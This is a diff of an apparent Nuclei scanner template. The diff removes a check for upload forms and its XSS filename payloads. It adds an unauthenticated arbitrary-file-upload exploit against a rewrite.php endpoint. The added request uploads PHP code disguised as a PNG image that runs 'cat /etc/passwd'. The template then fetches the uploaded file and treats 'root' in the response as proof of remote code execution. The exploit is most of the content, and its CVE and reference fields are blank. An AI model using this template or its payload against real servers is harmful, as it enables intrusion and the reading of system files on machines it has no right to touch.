@@ -1,31 +1,73 @@
 id: file-upload
 
 info:
-  name: Find file upload field
-  description: |
-    If you find a file upload function for an image, try introducing an image with XSS in the filename like so:
-    <img src=x onerror=alert('XSS')>.png
-    "><img src=x onerror=alert('XSS')>.png
-    "><svg onmouseover=alert(1)>.svg
-    <<script>alert('xss')<!--a-->a.png
-  author: topscoder
-  severity: info
+  name: file-upload
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    该产品存在任意文件上传，未经身份验证的攻击者可通过此漏洞获取服务器权限。
   reference:
-    - https://twitter.com/ninadmishra5/status/1637476773129785345
-  tags: info,form,upload,misc,xss
+    - 
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 
+    cvss-score: 9.5
+    cwe-id: CWE-434
+  metadata:
+    date: 
+    version: 
+    fofa-query: 
+  tags: fileupload,rce
+
+# ==================
+#       文件上传
+# ==================
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.php"
+  file_content: "file error"
+  pay1: '<?php echo 11*11;unlink(__FILE__);'
+
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+  - raw:
+      - |-
+        POST /manager/teletext/material/rewrite.php HTTP/1.1
+        Host: your-ip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+        Connection: close
+        
+        ------WebKitFormBoundaryOKldnDPT
+        Content-Disposition: form-data; name="tmp_name"; filename="{{file_name}}"
+        Content-Type: image/png
+        
+        <?php system("cat /etc/passwd");unlink(__FILE__);?>
+        ------WebKitFormBoundaryOKldnDPT
+        Content-Disposition: form-data; name="uploadtime"
+        
+        
+        ------WebKitFormBoundaryOKldnDPT--
 
-    matchers-condition: and
+      - |
+        GET {{url}}/ HTTP/1.1
+        Host: {{Hostname}}
+  
+    cookie-reuse: true
     matchers:
-      - type: status
-        status:
-          - 200
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "success")'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "root")'
+        condition: and
 
+    extractors:
       - type: regex
-        part: body
+        part: body_1
+        name: url
+        internal: true
+        group: 1
         regex:
-          - "<form.*?>.*?<input.*?type=.*?file.*?>"
+          - "(/xmedia/[^\"]*)"
